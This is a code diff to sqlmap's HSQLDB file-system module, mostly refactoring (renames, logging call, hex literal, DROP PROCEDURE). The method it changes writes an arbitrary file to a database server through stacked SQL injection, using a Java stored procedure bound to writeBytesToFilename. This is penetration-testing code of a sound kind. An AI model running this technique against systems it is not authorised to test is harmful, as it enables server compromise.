@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -21,13 +21,13 @@ class Filesystem(GenericFilesystem):
 
     @stackedmethod
     def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
-        funcName = randomStr()
+        func_name = randomStr()
         max_bytes = 1024 * 1024
 
-        debugMsg = "creating JLP procedure '%s'" % funcName
+        debugMsg = "creating JLP procedure '%s'" % func_name
         logger.debug(debugMsg)
 
-        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (funcName, max_bytes)
+        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (func_name, max_bytes)
         addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
         addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
         inject.goStacked(addFuncQuery)
@@ -41,17 +41,18 @@ class Filesystem(GenericFilesystem):
             warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
             warnMsg += "bytes, this might cause errors in the file "
             warnMsg += "writing process"
-            logger.warn(warnMsg)
+            logger.warning(warnMsg)
 
         debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
         logger.debug(debugMsg)
 
         # Reference: http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
-        invokeQuery = "CALL %s('%s', CAST('%s' AS VARBINARY(%s)))" % (funcName, remoteFile, fcEncodedStr, max_bytes)
+        invokeQuery = "CALL %s('%s', X'%s')" % (func_name, remoteFile, fcEncodedStr)
         inject.goStacked(invokeQuery)
 
-        logger.debug("cleaning up" % funcName)
-        delQuery = "DELETE PROCEDURE %s" % funcName
+        logger.debug("cleaning up the database management system")
+
+        delQuery = "DROP PROCEDURE %s" % func_name
         inject.goStacked(delQuery)
 
         message = "the local file '%s' has been written on the back-end DBMS" % localFile
